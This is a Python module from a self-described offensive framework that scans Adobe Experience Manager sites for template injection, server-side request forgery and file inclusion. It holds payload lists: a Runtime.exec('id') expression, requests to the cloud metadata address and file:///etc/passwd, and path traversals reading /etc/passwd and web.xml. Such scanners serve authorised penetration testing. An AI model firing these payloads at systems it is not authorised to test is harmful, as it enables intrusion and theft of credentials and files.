"""Injection Testing module for AEM Offensive Framework.

Tests for:
- SSTI (Server-Side Template Injection) via Sling Models/HTL
- SSRF (Server-Side Request Forgery) via Externalizer/LinkChecker
- LFI (Local File Inclusion) via Sling selectors
"""

import json
import re
import urllib.parse
from typing import List, Dict, Optional, Any, Tuple
from dataclasses import dataclass

from core.models import Finding, VulnSeverity, ScanPhase, BypassTechnique
from core.config import AEMConfig
from core.engine import HTTPXEngine


@dataclass
class InjectionPayload:
    """Represents an injection test payload."""
    name: str
    payload: str
    indicator: str
    type: str  # ssti, ssrf, lfi


class InjectionTestingModule:
    """Advanced injection testing for AEM vulnerabilities."""
    
    # SSTI payloads targeting Sling/HTL
    SSTI_PAYLOADS = [
        InjectionPayload(
            "Sling Expression EL",
            "${1+1}",
            "2",
            "ssti"
        ),
        InjectionPayload(
            "HTL Expression",
            "${'7'*7}",
            "7777777",
            "ssti"
        ),
        InjectionPayload(
            "Sling Scripting",
            "<%= 1+1 %>",
            "2",
            "ssti"
        ),
        InjectionPayload(
            "JSP Expression",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "uid",
            "ssti"
        ),
        InjectionPayload(
            "Groovy Simple",
            "${1+1}",
            "2",
            "ssti"
        ),
        InjectionPayload(
            "OSGi Property",
            "$[sling:resourceType]",
            "sling",
            "ssti"
        ),
    ]
    
    # SSRF payloads targeting Externalizer/LinkChecker
    SSRF_PAYLOADS = [
        InjectionPayload(
            "Localhost",
            "http://127.0.0.1/",
            "root",
            "ssrf"
        ),
        InjectionPayload(
            "Localhost Alt",
            "http://localhost/",
            "root",
            "ssrf"
        ),
        InjectionPayload(
            "AWS Metadata",
            "http://169.254.169.254/latest/meta-data/",
            "ami-id",
            "ssrf"
        ),
        InjectionPayload(
            "Internal Docker",
            "http://172.17.0.1/",
            "docker",
            "ssrf"
        ),
        InjectionPayload(
            "File Protocol",
            "file:///etc/passwd",
            "root:x",
            "ssrf"
        ),
        InjectionPayload(
            "DNS Rebind",
            "http://1.1.1.1.nip.io/",
            "cloudflare",
            "ssrf"
        ),
        InjectionPayload(
            "Gopher",
            "gopher://127.0.0.1:9000/_test",
            "error",
            "ssrf"
        ),
        InjectionPayload(
            "Internal Admin",
            "http://admin.internal/",
            "login",
            "ssrf"
        ),
    ]
    
    # LFI payloads via Sling selectors
    LFI_PAYLOADS = [
        InjectionPayload(
            "JCR Root",
            "/",
            "jcr:primaryType",
            "lfi"
        ),
        InjectionPayload(
            "Etc Passwd",
            "/etc/passwd",
            "root:x",
            "lfi"
        ),
        InjectionPayload(
            "Web XML",
            "/WEB-INF/web.xml",
            "web-app",
            "lfi"
        ),
        InjectionPayload(
            "Sling Properties",
            "/../sling.properties",
            "sling",
            "lfi"
        ),
        InjectionPayload(
            "Log Files",
            "/../logs/error.log",
            "ERROR",
            "lfi"
        ),
        InjectionPayload(
            "Config JSON",
            "/../config.json",
            "{",
            "lfi"
        ),
    ]
    
    # Externalizer endpoints
    EXTERNALIZER_ENDPOINTS = [
        "/bin/externalizer",
        "/bin/redirect",
        "/bin/linkchecker",
        "/system/sling/logout",
    ]
    
    # Cloud Services paths
    CLOUD_SERVICES_PATHS = [
        "/etc/cloudservices.json",
        "/etc/cloudservices/facebookconnect.json",
        "/etc/cloudservices/twitterconnect.json",
        "/etc/cloudservices/oembed.json",
        "/etc/cloudservices/translation.json",
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig):
        self.engine = engine
        self.config = config
    
    async def run(self, base_url: str) -> List[Finding]:
        """Run full injection testing suite."""
        findings = []
        
        # Test SSTI
        ssti_findings = await self._test_ssti(base_url)
        findings.extend(ssti_findings)
        
        # Test SSRF
        ssrf_findings = await self._test_ssrf(base_url)
        findings.extend(ssrf_findings)
        
        # Test LFI
        lfi_findings = await self._test_lfi(base_url)
        findings.extend(lfi_findings)
        
        return findings
    
    async def _test_ssti(self, base_url: str) -> List[Finding]:
        """Test for SSTI vulnerabilities in component properties."""
        findings = []
        
        # Test on component endpoints
        test_endpoints = [
            "/content.json",
            "/content/geometrixx/en.json",
            "/libs/foundation/components.json",
        ]
        
        for endpoint in test_endpoints:
            url = f"{base_url}{endpoint}"
            response = await self.engine.get(url)
            
            if response.status_code == 200:
                # Try to find editable properties
                try:
                    data = json.loads(response.text)
                    props = self._find_string_properties(data)
                    
                    # Test SSTI on each property
                    for prop_path, prop_value in props[:5]:  # Limit to first 5
                        for payload in self.SSTI_PAYLOADS:
                            result = await self._test_ssti_payload(
                                base_url, endpoint, prop_path, payload
                            )
                            if result:
                                findings.append(result)
                                
                except json.JSONDecodeError:
                    pass
        
        # Test direct SSTI on page parameters
        ssti_params = [
            "/content.html?sling:resourceType=",
            "/content.html?wcmmode=",
            "/bin/wcm/command?cmd=",
        ]
        
        for param_base in ssti_params:
            for payload in self.SSTI_PAYLOADS:
                encoded_payload = urllib.parse.quote(payload.payload)
                url = f"{base_url}{param_base}{encoded_payload}"
                response = await self.engine.get(url)
                
                if payload.indicator in response.text:
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique="SSTI Detection",
                        url=url,
                        severity=VulnSeverity.CRITICAL,
                        title=f"SSTI Vulnerability: {payload.name}",
                        description=f"SSTI detected using {payload.name} payload",
                        evidence={
                            "payload": payload.payload,
                            "indicator_found": payload.indicator,
                            "context": response.text[max(0, response.text.find(payload.indicator)-50):response.text.find(payload.indicator)+50]
                        },
                        chainable=True
                    ))
        
        return findings
    
    async def _test_ssti_payload(
        self, 
        base_url: str, 
        endpoint: str, 
        prop_path: str, 
        payload: InjectionPayload
    ) -> Optional[Finding]:
        """Test a single SSTI payload."""
        # This would require POST capability to modify properties
        # For now, just test GET parameters
        return None
    
    async def _test_ssrf(self, base_url: str) -> List[Finding]:
        """Test for SSRF vulnerabilities."""
        findings = []
        
        # Test Externalizer endpoints
        for endpoint in self.EXTERNALIZER_ENDPOINTS:
            for payload in self.SSRF_PAYLOADS:
                encoded = urllib.parse.quote(payload.payload, safe="")
                
                # Try different parameter names
                params = ["path", "url", "resource", "target", "redirect"]
                
                for param in params:
                    url = f"{base_url}{endpoint}?{param}={encoded}"
                    response = await self.engine.get(url)
                    
                    if self._check_ssrf_success(response, payload):
                        findings.append(Finding(
                            phase=ScanPhase.EXPLOITATION,
                            technique="SSRF Detection",
                            url=url,
                            severity=VulnSeverity.CRITICAL,
                            title=f"SSRF in {endpoint}",
                            description=f"SSRF vulnerability detected via {payload.name}",
                            evidence={
                                "payload": payload.payload,
                                "parameter": param,
                                "response_indicator": payload.indicator,
                                "response_length": len(response.text)
                            },
                            chainable=True
                        ))
        
        # Test Cloud Services for SSRF
        for cs_path in self.CLOUD_SERVICES_PATHS:
            url = f"{base_url}{cs_path}"
            response = await self.engine.get(url)
            
            if response.status_code == 200:
                # Check for embedded URLs that might be SSRF targets
                urls_found = re.findall(r'https?://[^\s\'"<>]+', response.text)
                
                if urls_found:
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Cloud Services URLs",
                        url=url,
                        severity=VulnSeverity.MEDIUM,
                        title="Cloud Services Configuration Exposed",
                        description=f"Found {len(urls_found)} URLs in cloud services config",
                        evidence={
                            "urls": urls_found[:10],
                            "service_path": cs_path
                        },
                        chainable=True
                    ))
        
        # Test LinkChecker
        linkchecker_findings = await self._test_linkchecker(base_url)
        findings.extend(linkchecker_findings)
        
        return findings
    
    async def _test_linkchecker(self, base_url: str) -> List[Finding]:
        """Test LinkChecker for SSRF."""
        findings = []
        
        linkchecker_endpoints = [
            "/bin/linkchecker.html",
            "/bin/linkchecker.json",
            "/system/console/linkchecker",
        ]
        
        for endpoint in linkchecker_endpoints:
            for payload in self.SSRF_PAYLOADS[:4]:  # Test first 4
                encoded = urllib.parse.quote(payload.payload, safe="")
                url = f"{base_url}{endpoint}?url={encoded}"
                
                response = await self.engine.get(url)
                
                if response.status_code == 200:
                    # Check for SSRF indicator
                    if payload.indicator in response.text or response.elapsed > 2.0:
                        findings.append(Finding(
                            phase=ScanPhase.EXPLOITATION,
                            technique="LinkChecker SSRF",
                            url=url,
                            severity=VulnSeverity.HIGH,
                            title="LinkChecker SSRF Vulnerability",
                            description=f"LinkChecker may be vulnerable to SSRF via {payload.name}",
                            evidence={
                                "payload": payload.payload,
                                "response_time": response.elapsed,
                                "indicator_found": payload.indicator in response.text
                            },
                            chainable=True
                        ))
        
        return findings
    
    async def _test_lfi(self, base_url: str) -> List[Finding]:
        """Test for LFI via Sling selectors."""
        findings = []
        
        # Test LFI via path traversal and selectors
        for payload in self.LFI_PAYLOADS:
            # Try various selector combinations
            selectors = [".json", ".txt", ".html"]
            
            for selector in selectors:
                url = f"{base_url}{payload.payload}{selector}"
                response = await self.engine.get(url)
                
                if payload.indicator in response.text:
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique="LFI via Sling Selectors",
                        url=url,
                        severity=VulnSeverity.HIGH,
                        title=f"LFI: {payload.name}",
                        description=f"LFI vulnerability via {payload.payload}{selector}",
                        evidence={
                            "payload": payload.payload,
                            "selector": selector,
                            "indicator": payload.indicator,
                            "snippet": response.text[max(0, response.text.find(payload.indicator)-30):response.text.find(payload.indicator)+30]
                        },
                        chainable=True
                    ))
        
        # Test specific AEM LFI patterns
        lfi_patterns = [
            ("/content/../{file}", "/etc/passwd"),
            ("/content./{file}", "/etc/passwd"),
            ("/{file}", "WEB-INF/web.xml"),
            ("///etc/{file}", "passwd"),
        ]
        
        for pattern, target_file in lfi_patterns:
            test_path = pattern.replace("{file}", target_file)
            url = f"{base_url}{test_path}.json"
            response = await self.engine.get(url)
            
            if "root:x" in response.text or "web-app" in response.text:
                findings.append(Finding(
                    phase=ScanPhase.EXPLOITATION,
                    technique="LFI Path Traversal",
                    url=url,
                    severity=VulnSeverity.CRITICAL,
                    title="LFI Path Traversal Successful",
                    description=f"Successfully read {target_file} via path traversal",
                    evidence={
                        "pattern": pattern,
                        "file": target_file,
                        "content_length": len(response.text)
                    },
                    chainable=True
                ))
        
        return findings
    
    def _find_string_properties(self, data: Any, prefix: str = "") -> List[Tuple[str, str]]:
        """Find all string properties in nested JSON."""
        results = []
        
        if isinstance(data, dict):
            for key, value in data.items():
                full_key = f"{prefix}.{key}" if prefix else key
                if isinstance(value, str):
                    results.append((full_key, value))
                elif isinstance(value, (dict, list)):
                    results.extend(self._find_string_properties(value, full_key))
        elif isinstance(data, list):
            for i, item in enumerate(data):
                full_key = f"{prefix}[{i}]"
                results.extend(self._find_string_properties(item, full_key))
        
        return results
    
    def _check_ssrf_success(self, response, payload: InjectionPayload) -> bool:
        """Check if SSRF payload was successful."""
        # Check for time-based detection
        if response.elapsed > 3.0 and payload.name in ["AWS Metadata", "Internal Admin"]:
            return True
        
        # Check for content indicator
        if payload.indicator in response.text:
            return True
        
        # Check for specific error messages that indicate SSRF
        error_indicators = [
            "connection refused",
            "no route to host",
            "timeout",
            "unreachable"
        ]
        
        text_lower = response.text.lower()
        if any(ind in text_lower for ind in error_indicators):
            # Connection attempted but failed - potential SSRF
            return True
        
        return False
